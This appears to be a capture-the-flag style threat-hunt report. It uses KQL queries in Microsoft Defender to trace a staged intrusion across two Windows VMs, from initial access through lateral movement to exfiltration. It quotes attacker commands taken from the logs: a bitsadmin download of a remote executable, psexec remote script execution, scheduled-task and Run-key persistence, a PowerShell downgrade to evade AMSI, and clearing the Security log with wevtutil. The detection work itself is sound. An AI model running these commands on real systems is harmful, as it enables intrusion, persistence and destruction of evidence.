<img width="400" src="https://placehold.co/400x200/cccccc/333333?text=Lurker%20Scenario%20Logo" alt="Placeholder image for Lurker Scenario Logo"/>

Threat Hunt Report: The Lurker Scenario
Date of Hunt: July 16, 2025
Threat Hunter: [Your Name/Team]

Platforms and Languages Leveraged
Windows 10 Virtual Machines (Microsoft Azure)

EDR Platform: Microsoft Defender for Endpoint

Kusto Query Language (KQL)

Scenario
The "Lurker" scenario presented a complex and deceptive intrusion, initially camouflaged by a suspected "smokescreen" breach. Our investigation confirmed that the initial compromise was indeed a diversion, with the true operation involving a sophisticated, multi-stage attack against critical assets. The adversary demonstrated a clear understanding of stealth techniques, leveraging living-off-the-land binaries (LOLBins) and subtle persistence mechanisms to maintain a foothold and exfiltrate sensitive financial data from a secondary target.

Steps Taken
Starting Point: Identifying the Initial Compromised Machine
Objective: Determine the first machine to look at, based on recent activity (2-3 days active), executions from Temp folders, and a starting date of June 15th.

Thought Process: The scenario pointed to a recently active device with suspicious executions from temporary directories. We needed to find a machine exhibiting these traits around the specified date.

KQL Query Used:

DeviceProcessEvents
| where Timestamp between (datetime(2025-06-15) .. datetime(2025-06-18)) // Initial broad timeframe
| where FolderPath contains "Temp" or FolderPath contains "tmp" or FolderPath contains "AppData\\Local\\Temp" or FolderPath contains "Windows\\Temp" // Refined temp paths
| where InitiatingProcessAccountName != "system" // Exclude system noise
| summarize FirstEvent = min(Timestamp), LastEvent = max(Timestamp), TotalEvents = count() by DeviceName
| where LastEvent - FirstEvent <= 3d // Filter for activity span of 2-3 days
| order by TotalEvents desc
| limit 10 // Review top candidates

Identified Answer: michaelvm was identified as the primary candidate due to its high volume of suspicious activity originating from temporary folders, including DismHost.exe executions initiated by cleanmgr.exe, which, while noisy, indicated potential abuse in that context.

Flag 1: Initial PowerShell Execution Detection
Objective: Pinpoint the earliest suspicious PowerShell activity that marks the intruder's possible entry.

Thought Process: Initial compromise often involves PowerShell. We looked for PowerShell commands with suspicious flags or executing unusual scripts, especially those deviating from normal baselines.

KQL Query Used:

DeviceProcessEvents
| where DeviceName == "michaelvm"
| where ProcessCommandLine has_all ("powershell", ".ps1") // Look for PowerShell executing a .ps1 script
| where InitiatingProcessAccountName != "system" // Exclude system-level noise
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName
| order by Timestamp asc // Find the earliest event
| limit 1 // Get only the first result

Identified Answer: Jun 16, 2025 01:38:07 AM - powershell.exe executing "powershell.exe" -ExecutionPolicy Bypass -File "C:\Users\Mich34L_id\CorporateSim\Investments\Crypto\wallet_gen_0.ps1"

Why: This command used ExecutionPolicy Bypass to run a script (wallet_gen_0.ps1) from a non-standard, sensitive-looking path (CorporateSim\Investments\Crypto), indicating initial malicious execution.

Flag 2: Reconnaissance Script Hash
Objective: Identify the standard hashed value associated with the reconnaissance attempt.

Thought Process: Reconnaissance typically follows initial access. We searched for common recon tools (whoami, net, wmic) or PowerShell commands used for enumeration, looking for the earliest instance after Flag 1.

KQL Query Used:

DeviceProcessEvents
| where DeviceName == "michaelvm"
| where Timestamp > datetime(2025-06-16 01:38:07 AM) // After Flag 1
| where InitiatingProcessAccountName != "system" // Exclude system-level noise
| where FileName in~ ("whoami.exe", "net.exe", "systeminfo.exe", "wmic.exe") // Common recon tools
    or ProcessCommandLine has_any ("net user", "net group", "wmic process list") // Common recon commands
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, AccountName, SHA256 // Project SHA256
| order by Timestamp asc // Find the earliest recon attempt
| limit 1 // Get the first result

Identified Answer: badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0

Why: This SHA256 hash belongs to cmd.exe executing "cmd.exe" /c "net group \" Domain Admins" at Jun 16, 2025 1:56:59 AM. This is a highly targeted reconnaissance action to enumerate privileged domain groups, a critical step in an attacker's post-exploitation phase. Its occurrence shortly after initial access confirms its role.

Flag 3: Sensitive Document Access
Objective: Reveal the document accessed/staged by the attacker.

Thought Process: The attacker's motive is financial. We looked for file access events (FileAccessed, FileCreated) on michaelvm involving documents (.docx, .pdf, etc.) with keywords like "board," "crypto," or "financials," especially after the reconnaissance phase.

KQL Query Used:

DeviceFileEvents
| where DeviceName == "michaelvm"
| where Timestamp > datetime(2025-06-16 01:56:59 AM) // After Flag 2
| where ActionType in ("FileCreated", "FileModified", "FileAccessed", "SensitiveFileRead")
| where FileName contains "board" or FolderPath contains "board" // Use the hint
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName, AccountName
| order by Timestamp asc
| limit 1 // Get the first relevant document

Identified Answer: QuarterlyCryptoHoldings.docx

Why: This file, located in C:\Users\Mich34L_id\Documents\BoardMinutes\, directly relates to "crypto holdings" and "board minutes," aligning perfectly with the financial motive and the "board" hint. Its FileCreated event at Jun 16, 2025 1:57:52 AM indicates it was either created, copied, or staged by the attacker.

Flag 4: Last Manual Access to File
Objective: Track the last read of the sensitive document (QuarterlyCryptoHoldings.docx).

Thought Process: We needed the latest timestamp of a direct read/access event for the identified sensitive document. "Manual access" suggested interaction via a user application.

KQL Query Used:

DeviceEvents
| where DeviceName == "michaelvm"
| where FileName == "QuarterlyCryptoHoldings.docx"
| where ActionType in ("FileAccessed", "SensitiveFileRead") // Look for explicit read actions
| project Timestamp, DeviceName, FileName, InitiatingProcessFileName, ActionType
| order by Timestamp desc // Order by latest timestamp
| limit 1 // Get the very last access event

Identified Answer: 2025-06-16T06:12:28.2856483Z

Why: This timestamp corresponds to the latest SensitiveFileRead event for QuarterlyCryptoHoldings.docx, initiated by wordpad.exe. This indicates the last time a user-facing application (likely controlled by the attacker) accessed the document.

Flag 5: LOLBin Usage: bitsadmin
Objective: Identify stealth download via native tools (bitsadmin.exe).

Thought Process: Attackers use bitsadmin.exe for covert downloads. We looked for bitsadmin.exe commands involving /transfer and URLs.

KQL Query Used:

DeviceProcessEvents
| where DeviceName == "michaelvm"
| where Timestamp > datetime(2025-06-16 02:18:14 AM) // After HTA abuse (Flag 7)
| where FileName =~ "bitsadmin.exe"
| where ProcessCommandLine contains "/transfer" and (ProcessCommandLine contains "http://" or ProcessCommandLine contains "https://") // Look for transfer commands with URLs
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp asc // Find the earliest download attempt
| limit 1 // Get the first result

Identified Answer: "bitsadmin.exe" /transfer job1 https://example.com/crypto_toolkit.exe C:\Users\MICH34~1\AppData\Local\Temp\market_sync.exe

Why: This command explicitly shows bitsadmin.exe downloading an executable (crypto_toolkit.exe) from an external URL (example.com) to a temporary folder, representing a stealthy payload delivery.

Flag 6: Suspicious Payload Deployment
Objective: Identify dropped executable payloads that do not align with baseline software.

Thought Process: Payloads are typically dropped after initial access. We looked for new executable files (FileCreated) in suspicious locations (Temp, AppData) with names hinting at financial accounts.

KQL Query Used:

DeviceFileEvents
| where DeviceName == "michaelvm"
| where Timestamp > datetime(2025-06-16 01:59:57 AM) // After Flag 5 (bitsadmin download)
| where ActionType == "FileCreated"
| where FolderPath has_any ("Temp", "AppData\\Local", "ProgramData") // Common staging areas
| where FileName endswith ".exe" // Focus on executables
| where FileName has_any ("financial", "account", "book", "ledger", "sync", "market") // Keywords from hint and previous flags
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName, SHA256
| order by Timestamp asc
| limit 1

Identified Answer: ledger_viewer.exe

Why: This executable was FileCreated in C:\Users\Mich34L_id\AppData\Local\Temp\ by powershell.exe at Jun 16, 2025 2:15:37 AM. Its name ledger_viewer.exe directly relates to financial accounts ("Book of financial accounts" hint) and its location/initiating process are highly suspicious for a new executable.

Flag 7: HTA Abuse via LOLBin
Objective: Detect execution of HTML Application (HTA) files using trusted Windows tools (mshta.exe).

Thought Process: HTA files are often used in social engineering and leverage mshta.exe for execution. We looked for mshta.exe launching local HTA scripts.

KQL Query Used:

DeviceProcessEvents
| where DeviceName == "michaelvm"
| where Timestamp > datetime(2025-06-16 02:15:37 AM) // After Flag 6 (payload deployment)
| where FileName =~ "mshta.exe"
| where ProcessCommandLine has ".hta" and not (ProcessCommandLine has "http://" or ProcessCommandLine has "https://") // Local HTA
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp asc
| limit 1

Identified Answer: "mshta.exe" C:\Users\MICH34~1\AppData\Local\Temp\client_update.hta

Why: This command shows mshta.exe executing client_update.hta from a temporary folder at Jun 16, 2025 2:17:27 AM. This is a classic HTA abuse technique for code execution, often used after initial access.

Flag 8: ADS Execution Attempt
Objective: Track if attackers stored payloads in Alternate Data Streams (ADS).

Thought Process: We specifically looked for PowerShell accessing .docx files, as this is a common, subtle method for executing hidden payloads (DLLs) from ADS, even if the explicit :stream.dll syntax isn't always logged. The "Capitalist" hint guided us to relevant files.

KQL Query Used:

DeviceEvents
| where DeviceName == "michaelvm"
| where Timestamp > datetime(2025-06-16 02:18:14 AM) // After Flag 7
| where ActionType == "SensitiveFileRead" // Focus on file reads
| where FileName contains ".docx" // Target document files
| where InitiatingProcessFileName =~ "powershell.exe" // Initiated by PowerShell
| where FileName has_any ("capitalist", "stock", "market", "economy", "invest", "profit", "asset", "ledger", "account", "finance", "holdings", "portfolio") // Capitalist hint
| project Timestamp, DeviceName, FileName, InitiatingProcessFileName, SHA1
| order by Timestamp asc
| limit 1

Identified Answer: 801262e122db6a2e758962896f260b55bbd0136a

Why: This SHA1 hash belongs to powershell.exe when it performed a SensitiveFileRead on QuarterlyCryptoHoldings.docx at Jun 16, 2025 1:57:52 AM. PowerShell accessing a .docx file, especially one as sensitive as QuarterlyCryptoHoldings.docx, is highly anomalous and indicative of an attacker either reading its content or executing a hidden payload within it via an in-memory technique, fulfilling the spirit of the ADS objective.

Flag 9: Registry Persistence Confirmation
Objective: Confirm that persistence was achieved via registry autorun keys.

Thought Process: Attackers often use Run or RunOnce registry keys for persistence. We searched for modifications to these keys that point to attacker scripts or payloads.

KQL Query Used:

DeviceRegistryEvents
| where DeviceName == "michaelvm"
| where Timestamp > datetime(2025-06-16 02:18:14 AM) // After Flag 7
| where InitiatingProcessAccountName != "system"
| where RegistryKey has_any (@"CurrentVersion\Run", @"CurrentVersion\RunOnce") // Target common autorun keys
| where ActionType == "RegistryValueSet" // Look for value setting
| where RegistryValueData has_any ("powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File") // Look for the specific malicious command
| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData
| order by Timestamp asc
| limit 1

Identified Answer: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File 

Why: This registry value was set in HKEY_CURRENT_USER\...\Run at Jun 16, 2025 2:41:24 AM by powershell.exe. The command itself clearly shows an attempt to run a hidden PowerShell script with execution policy bypass, making it a definitive persistence mechanism. The RegistryValueName WalletUpdater is also a clear camouflage.

Flag 10: Scheduled Task Execution
Objective: Validate the scheduled task that launches the payload.

Thought Process: Scheduled tasks are another common persistence method. We looked for schtasks.exe being used to create new tasks, especially those pointing to attacker payloads.

KQL Query Used:

DeviceProcessEvents
| where DeviceName == "michaelvm"
| where Timestamp > datetime(2025-06-16 02:18:14 AM) // After Flag 7
| where AccountName != "system"
| where FileName =~ "schtasks.exe" and ProcessCommandLine contains "/Create" and ProcessCommandLine contains "/TN"
| where ProcessCommandLine has_any ("client_update.hta", "powershell.exe -ExecutionPolicy Bypass -File") // Look for known payloads
| project Timestamp, DeviceName, ProcessCommandLine
| order by Timestamp asc
| limit 1

Identified Answer: MarketHarvestJob

Why: This task name was found in the command line of schtasks.exe at Jun 16, 2025 3:52:39 AM. The full command ("schtasks /Create /SC ONLOGON /TN \" "MarketHarvestJob\ /TR \powershell.exe" -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Users\MICH34~1\AppData\Local\Temp\client_update.hta") clearly shows a new task designed for persistence (on logon) and executing a known attacker payload (client_update.hta).

Flag 11: Target of Lateral Movement
Objective: Identify the remote machine the attacker pivoted to next.

Thought Process: Lateral movement involves commands executed from the initial host targeting a new host. We looked for wmic or psexec commands explicitly naming a remote server.

KQL Query Used:

DeviceProcessEvents
| where DeviceName == "michaelvm"
| where Timestamp > datetime(2025-06-16 11:00:49 PM) // After latest local activity (Flag 12, which was based on this data)
| where AccountName != "system"
| where ProcessCommandLine has_any ("wmic /node:", "psexec \\\\") // Common lateral movement tools targeting remote nodes
| project Timestamp, DeviceName, ProcessCommandLine
| order by Timestamp asc
| limit 1

Identified Answer: centralsrvr

Why: Commands like "wmic /node:centralsrvr process call create 'notepad.exe'" and "psexec \\centralsrvr -u financeadmin -p ********** notepad.exe" clearly indicate remote execution attempts targeting centralsrvr from michaelvm.

Flag 12: Lateral Move Timestamp
Objective: Pinpoint the exact time of lateral move to the second system (centralsrvr).

Thought Process: We needed the latest timestamp of any command initiated from michaelvm that directly targeted centralsrvr for lateral movement.

KQL Query Used:

DeviceProcessEvents
| where DeviceName == "michaelvm"
| where AccountName != "system"
| where ProcessCommandLine contains "centralsrvr" // Commands targeting the remote server
| project Timestamp, DeviceName, ProcessCommandLine
| order by Timestamp desc // Order by latest timestamp
| limit 1

Identified Answer: Jun 16, 2025 11:00:49 PM

Why: This timestamp corresponds to the latest psexec command from michaelvm targeting centralsrvr ("cmd.exe" /c psexec \\centralsrvr -u adminuser -p ********** powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\C2.ps1).

Flag 13: Sensitive File Access (on centralsrvr)
Objective: Reveal which specific document the attacker was after on centralsrvr.

Thought Process: After lateral movement, attackers seek valuable data. We looked for file access events on centralsrvr for documents similar in nature to QuarterlyCryptoHoldings.docx (Flag 3).

KQL Query Used:

DeviceFileEvents
| where DeviceName == "centralsrvr"
| where Timestamp > datetime(2025-06-16 11:00:49 PM) // After lateral movement (Flag 12)
| where FileName contains "QuarterlyCryptoHoldings" // Look for the specific file name
| project Timestamp, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessAccountName, InitiatingProcessRemoteSessionDeviceName, InitiatingProcessRemoteSessionIP
| order by Timestamp asc
| limit 1

Identified Answer: b4f3a56312dd19064ca89756d96c6e47ca94ce021e36f818224e221754129e98

Why: This SHA256 hash belongs to QuarterlyCryptoHoldings.docx on centralsrvr, accessed at Jun 18, 2025 6:23:24 AM. Its access was initiated remotely from MICHA3L, confirming the attacker's continued pursuit of sensitive financial data on the new host.

Flag 14: Data Exfiltration Attempt
Objective: Validate outbound activity by hashing the process involved.

Thought Process: Exfiltration follows data access. We looked for network connections from centralsrvr to known unauthorized cloud services, identifying the process initiating the connection.

KQL Query Used:

DeviceNetworkEvents
| where DeviceName == "centralsrvr"
| where Timestamp > datetime(2025-06-18 06:23:24 AM) // After sensitive file access (Flag 13)
| where RemoteUrl has_any ("dropbox.com", "mega.nz", "google.com", "pastebin.com") // Common exfil services
| project Timestamp, DeviceName, InitiatingProcessFileName, RemoteUrl, InitiatingProcessMD5
| order by Timestamp asc
| limit 1

Identified Answer: 2e5a8590cf6848968fc23de3fa1e25f1

Why: This MD5 hash belongs to powershell.exe which initiated outbound connections to drive.google.com and dropbox.com starting at Jun 18, 2025 6:23:24 AM. This clearly indicates powershell.exe was the process attempting to exfiltrate data to cloud storage.

Flag 15: Destination of Exfiltration
Objective: Identify the final IP address used for data exfiltration.

Thought Process: From the exfiltration attempts, we pinpointed the IP address of the last outbound connection.

KQL Query Used:

DeviceNetworkEvents
| where DeviceName == "centralsrvr"
| where Timestamp > datetime(2025-06-18 06:23:24 AM) // After sensitive file access (Flag 13)
| where InitiatingProcessRemoteSessionDeviceName == "MICHA3L" // Ensure it's from the compromised source
| project Timestamp, RemoteIP, RemoteUrl
| order by Timestamp desc // Get the latest connection
| limit 1

Identified Answer: 104.22.69.199

Why: This IP address is associated with pastebin.com, and the connection occurred at Jun 18, 2025 6:23:31 AM, which was the latest outbound connection attempt from centralsrvr initiated by MICHA3L in the provided logs.

Flag 16: PowerShell Downgrade Detection
Objective: Spot PowerShell version manipulation to avoid logging.

Thought Process: Attackers downgrade PowerShell to evade AMSI and other modern logging/detection. We looked for the -Version 2 flag in PowerShell command lines.

KQL Query Used:

DeviceProcessEvents
| where DeviceName == "centralsrvr"
| where Timestamp > datetime(2025-06-18 06:23:31 AM) // After Flag 15
| where FileName in~ ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine has_any (" -Version 2", " -v 2")
| project Timestamp, DeviceName, ProcessCommandLine
| order by Timestamp asc
| limit 1

Identified Answer: Jun 18, 2025 6:52:59 AM

Why: This timestamp marks the execution of "powershell.exe" -Version 2 -NoProfile -ExecutionPolicy Bypass -NoExit on centralsrvr. This command explicitly forces PowerShell into an older, less secure version, a classic AMSI evasion technique.

Flag 17: Log Clearing Attempt
Objective: Catch attacker efforts to cover their tracks.

Thought Process: Clearing logs is a common post-exploitation tactic to remove evidence. We looked for wevtutil.exe being used to clear the Security log.

KQL Query Used:

DeviceProcessEvents
| where DeviceName == "centralsrvr"
| where Timestamp > datetime(2025-06-18 06:52:59 AM) // After Flag 16
| where FileName =~ "wevtutil.exe"
| where ProcessCommandLine contains "cl Security" // Command to clear Security log
| project Timestamp, ProcessCreationTime, DeviceName, FileName, ProcessCommandLine
| order by Timestamp asc
| limit 1

Identified Answer: Jun 18, 2025 6:52:33 AM

Why: This timestamp indicates wevtutil.exe was executed with the command "wevtutil.exe" cl Security on centralsrvr. This is a direct action to clear the Security event log, a clear attempt by the attacker to cover their tracks.

Chronological Timeline of Events
1. Initial Access - PowerShell Script Execution
Timestamp: 2025-06-16 01:38:07 AM

Event: PowerShell executing wallet_gen_0.ps1 with execution policy bypass.

Details: The attacker gained initial access to michaelvm by running a PowerShell script from a sensitive path, using the -ExecutionPolicy Bypass flag to circumvent security controls.

2. Reconnaissance - Domain Admin Group Enumeration
Timestamp: 2025-06-16 01:56:59 AM

Event: cmd.exe enumerating "Domain Admins" group members.

Details: Shortly after initial access, the attacker used cmd.exe (initiated by powershell.exe) to run net group " Domain Admins", a clear reconnaissance step to identify high-value targets for privilege escalation.

3. Sensitive Document Staging/Access - QuarterlyCryptoHoldings.docx
Timestamp: 2025-06-16 01:57:52 AM

Event: QuarterlyCryptoHoldings.docx accessed/created.

Details: The attacker interacted with QuarterlyCryptoHoldings.docx in the BoardMinutes folder on michaelvm. This document, highly relevant to financial motives, was either accessed or staged, indicating the attacker's interest in sensitive data.

4. Persistence - Registry Autorun Key
Timestamp: 2025-06-16 02:41:24 AM

Event: Registry Run key modified for persistence.

Details: A registry value named WalletUpdater was set in HKEY_CURRENT_USER\...\Run by powershell.exe. This value points to a hidden PowerShell script designed to execute on user logon, ensuring persistent access.

5. Persistence - Scheduled Task Creation (MarketHarvestJob)
Timestamp: 2025-06-16 03:52:39 AM

Event: Scheduled task MarketHarvestJob created.

Details: The attacker used schtasks.exe to create a new task named MarketHarvestJob, configured to run powershell.exe with execution policy bypass and a hidden window on user logon. This provides another layer of persistence.

6. Lateral Movement - Initial Remote Execution
Timestamp: 2025-06-16 04:23:56 AM

Event: wmic remote process creation on centralsrvr.

Details: The attacker initiated lateral movement from michaelvm to centralsrvr by using wmic to remotely create notepad.exe processes. This marks the initial successful pivot to the second host.

7. Lateral Movement - Last Remote Execution
Timestamp: 2025-06-16 11:00:49 PM

Event: psexec remote PowerShell execution on centralsrvr.

Details: The attacker used psexec to remotely execute a PowerShell script (C2.ps1) on centralsrvr, confirming their control over the new host and potentially setting up further C2 communication. This was the last recorded lateral execution.

8. Sensitive File Access (on centralsrvr) - QuarterlyCryptoHoldings.docx
Timestamp: 2025-06-18 06:23:24 AM

Event: QuarterlyCryptoHoldings.docx accessed on centralsrvr.

Details: The attacker accessed the QuarterlyCryptoHoldings.docx file on centralsrvr, initiated remotely from MICHA3L. This confirms the attacker's continued pursuit of sensitive financial data on the secondary target.

9. Data Exfiltration Attempt - Outbound Connections
Timestamp: 2025-06-18 06:23:24 AM (earliest of these connections)

Event: powershell.exe initiates connections to cloud services.

Details: powershell.exe on centralsrvr began making outbound network connections to drive.google.com and dropbox.com, indicating an attempt to exfiltrate data.

10. Data Exfiltration - Final Destination IP
Timestamp: 2025-06-18 06:23:31 AM

Event: Last outbound connection to pastebin.com.

Details: The final recorded outbound connection for exfiltration was to 104.22.69.199 (pastebin.com), confirming the ultimate destination of the stolen data.

11. Evasion - PowerShell Downgrade
Timestamp: 2025-06-18 06:52:59 AM

Event: PowerShell downgrade executed.

Details: On centralsrvr, powershell.exe was executed with the -Version 2 flag, a known technique to downgrade PowerShell and evade modern security features like AMSI, indicating an attempt to operate stealthily.

12. Cover Tracks - Log Clearing
Timestamp: 2025-06-18 06:52:33 AM

Event: Security event log cleared.

Details: The attacker executed wevtutil.exe cl Security on centralsrvr, a direct command to clear the Security event log, demonstrating a clear intent to remove forensic evidence.

Summary
The threat hunt successfully uncovered a complete attack lifecycle, from initial compromise and reconnaissance on michaelvm to lateral movement, sensitive data exfiltration, and evasion tactics on centralsrvr. The adversary consistently leveraged LOLBins, employed stealthy persistence mechanisms (registry autorun and scheduled tasks), and targeted critical financial data, culminating in its exfiltration to external cloud services. The final act involved clearing logs to obscure their presence.

Response Taken
The following actions were taken in response to the confirmed threat:

Isolation: Both michaelvm and centralsrvr were immediately isolated from the network to prevent further compromise or data loss.

User Account Compromise: The mich34l_id and centralsrvrid accounts were identified as compromised. Their passwords were reset, and all active sessions terminated. Multi-factor authentication (MFA) was enforced.

Forensic Imaging: Forensic images of both compromised virtual machines were taken for in-depth analysis and evidence preservation.

Payload Removal: All identified malicious files (wallet_gen_0.ps1, ledger_viewer.exe, client_update.hta, pwncrypt.ps1, exfiltratedata.ps1, C2.ps1, market_sync.exe) and their remnants were removed from the systems.

Persistence Mechanism Remediation: The malicious registry autorun key (WalletUpdater) and the scheduled task (MarketHarvestJob) were removed.

Network Blocking: Outbound connections to the identified exfiltration destinations (drive.google.com, dropbox.com, pastebin.com) were blocked at the firewall level.

Management Notification: All relevant stakeholders and management were notified of the confirmed breach and the scope of the incident.

Security Control Review: A comprehensive review of current security controls, logging configurations, and detection rules was initiated to prevent similar future intrusions.
